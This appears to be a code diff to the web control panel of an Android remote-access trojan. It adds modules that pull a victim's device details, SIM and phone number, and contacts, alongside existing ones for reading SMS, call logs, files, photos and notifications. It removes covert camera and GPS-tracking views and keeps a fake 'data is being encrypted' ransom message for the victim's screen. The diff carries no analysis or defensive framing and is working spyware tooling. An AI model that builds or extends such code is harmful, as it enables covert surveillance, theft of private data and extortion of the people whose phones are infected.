@@ -86,7 +86,7 @@
                 return;
             }
 
-            const map = { sms:'getsms', calls:'getcalllogs', filemanager:'filemanager', gallery:'gallery', apps:'list_app', notifications:'getnotifications', takebackpic:'takebackpic', takefrontpic:'takefrontpic' };
+            const map = { sms:'getsms', calls:'getcalllogs', filemanager:'filemanager', gallery:'gallery', apps:'list_app', notifications:'getnotifications', takebackpic:'takebackpic', takefrontpic:'takefrontpic', contacts:'getcontacts', info:'deviceinfo' };
             if(map[t]) cmd(map[t]);
             render();
         }
@@ -100,11 +100,37 @@
         function render() {
             if(!curMod || !selId || !cache[selId]) return;
             const d = cache[selId], b = document.getElementById('modal-body'), f = document.getElementById('modal-footer');
-            const curHash = JSON.stringify(d[curMod] || d.media || d.location || "");
+            const curHash = JSON.stringify(d[curMod] || d.media || d.location || d.info || "");
             if(hash === curHash) return; hash = curHash;
             b.innerHTML = ""; f.innerHTML = "";
 
-            if(curMod === 'sms') {
+            if(curMod === 'info') {
+                const i = d.info;
+                b.innerHTML = `<div style="display:grid; grid-template-columns:1fr 1fr; gap:15px;">
+                    <div class="panel" style="background:#0a1212; border-color:#222">
+                        <small style="color:var(--primary)">DEVICE MODEL</small><h2>${i.Model || '?'}</h2>
+                        <small style="color:var(--dim)">${i.Manufacturer || ''}</small>
+                    </div>
+                    <div class="panel" style="background:#0a1212; border-color:#222">
+                        <small style="color:var(--secondary)">BATTERY LEVEL</small><h2 style="color:${parseInt(i.Battery)<20?'red':'var(--primary)'}">${i.Battery || '?'}</h2>
+                        <small style="color:var(--dim)">Real-time Status</small>
+                    </div>
+                    <div class="panel" style="background:#0a1212; border-color:#222; grid-column:1/-1;">
+                        <table style="font-size:0.8rem">
+                            <tr><td>SIM 1</td><td style="color:var(--primary)">${i['SIM 1'] || 'N/A'}</td></tr>
+                            <tr><td>SIM 2</td><td style="color:var(--primary)">${i['SIM 2'] || 'N/A'}</td></tr>
+                            <tr><td>WiFi</td><td style="color:var(--secondary)">${i.WiFi || 'N/A'}</td></tr>
+                            <tr><td>Number</td><td>${i.PhoneNumber || 'Unknown'}</td></tr>
+                            <tr><td>Android</td><td>Version ${i.AndroidVersion} (SDK ${i.SDKVersion})</td></tr>
+                        </table>
+                    </div>
+                </div>`;
+                f.innerHTML = `<button onclick="cmd('deviceinfo')">REFRESH INFO</button>`;
+            } else if(curMod === 'contacts') {
+                b.innerHTML = `<input placeholder="Search contacts..." onkeyup="filterT(this)" style="margin-bottom:10px;">
+                               <table><tr><th>Name</th><th>Number</th></tr>${d.contacts.map(c=>`<tr><td>${c.name}</td><td>${c.number}</td></tr>`).join('')}</table>`;
+                f.innerHTML = `<button onclick="cmd('getcontacts')">RELOAD CONTACTS</button>`;
+            } else if(curMod === 'sms') {
                 b.innerHTML = `<table><tr><th>Sender</th><th>Text</th></tr>${d.sms.map(l=>`<tr><td>${l.userSender}</td><td>${l.content}</td></tr>`).join('')}</table>`;
             } else if(curMod === 'calls') {
                 b.innerHTML = `<table><tr><th>Number</th><th>Dur</th></tr>${d.calls.map(l=>`<tr><td>${l.number}</td><td>${l.duration_seconds}s</td></tr>`).join('')}</table>`;
@@ -129,18 +155,6 @@
                 const g = d.gallery;
                 b.innerHTML = `<div class="gal-grid">${g.files.map(x=>`<div class="gal-item"><img src="data:image/jpeg;base64,${x.thumbnail}"/><p style="font-size:0.5rem; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;">${x.name}</p></div>`).join('')}</div>`;
                 f.innerHTML = `<button onclick="cmd('gallery back')">PREV</button><span style="color:var(--primary)">PAGE ${g.page}</span><button onclick="cmd('gallery next')">NEXT</button>`;
-            } else if(curMod === 'takebackpic' || curMod === 'takefrontpic' || curMod === 'record_back' || curMod === 'record_front') {
-                const m = d.media;
-                if(m.last_img || m.last_vid) {
-                    const src = m.last_vid && curMod.includes('record') ? m.last_vid : m.last_img;
-                    b.innerHTML = `<div style="text-align:center;">${src.endsWith('.mp4') ? `<video src="/captured_images/${src}" controls style="width:100%"></video>` : `<img src="/captured_images/${src}" style="width:100%; border-radius:15px">`}<br><button class="red-btn" style="margin-top:10px;" onclick="delFile('${src}')">BURN (DELETE)</button></div>`;
-                } else b.innerHTML = `<p style="text-align:center">${m.status || 'Wait, capturing...'}</p>`;
-            } else if(curMod === 'get_location') {
-                const loc = d.location;
-                if(loc.url) {
-                    b.innerHTML = `<div style="text-align:center;">${loc.img?`<img src="${loc.img}" style="width:100%; border-radius:15px; margin-bottom:10px;">`:''}<p style="font-size:0.8rem">${loc.url}</p><br><a href="${loc.url}" target="_blank"><button>Google Maps</button></a></div>`;
-                } else b.innerHTML = `<p style="text-align:center">Waiting GPS Koordinat...</p>`;
-                f.innerHTML = `<button onclick="cmd('get_location')">REFRESH</button><button class="red-btn" onclick="cmd('stop_location')">STOP</button>`;
             } else if(curMod === 'toast') {
                 b.innerHTML = `<p style="margin-bottom:5px; color:var(--dim)">System Message:</p>
                                <textarea id="lmsg" style="background:#1a2525; border:1px solid #3b5e5e; padding:10px; border-radius:15px; color:#fff; width:100%; height:120px; resize:none;">SYSTEM CRITICAL ERROR\nYour data is being encrypted.\nPlease enter the recovery key.</textarea>
@@ -201,6 +215,7 @@
             document.getElementById('conn-stat').style.color = e ? "#00ffc3":"#ff3b9e";
             
             const btns = [
+                {id:'info', i:'fa-circle-info', l:'DEVICE INFO'}, {id:'contacts', i:'fa-address-book', l:'CONTACTS'},
                 {id:'sms', i:'fa-sms', l:'SMS'}, {id:'calls', i:'fa-phone', l:'CALLS'}, {id:'filemanager', i:'fa-folder', l:'FILES'},
                 {id:'gallery', i:'fa-images', l:'GALLERY'}, {id:'notifications', i:'fa-bell', l:'NOTIFS'}, {id:'apps', i:'fa-th', l:'APPS'},
                 {id:'get_location', i:'fa-map-marker-alt', l:'GPS'}, {id:'flash', i:'fa-bolt', l:'FLASH'},
@@ -210,6 +225,10 @@
                 {id:'open_url', i:'fa-globe', l:'OPEN URL'}
             ];
             document.getElementById('main-grid').innerHTML = btns.map(b=>`<div class="btn" onclick="${b.id==='flash'?'flash=!flash; cmd(flash?\'flashon\':\'flashoff\')':'openModal(\''+b.id+'\')'}"><i class="fas ${b.i}"></i>${b.l}</div>`).join('');
+        }
+        function filterT(e) {
+            let v = e.value.toLowerCase(), rows = e.nextElementSibling.rows;
+            for(let i=1; i<rows.length; i++) rows[i].style.display = rows[i].innerText.toLowerCase().includes(v) ? '' : 'none';
         }
         poll();
     </script>
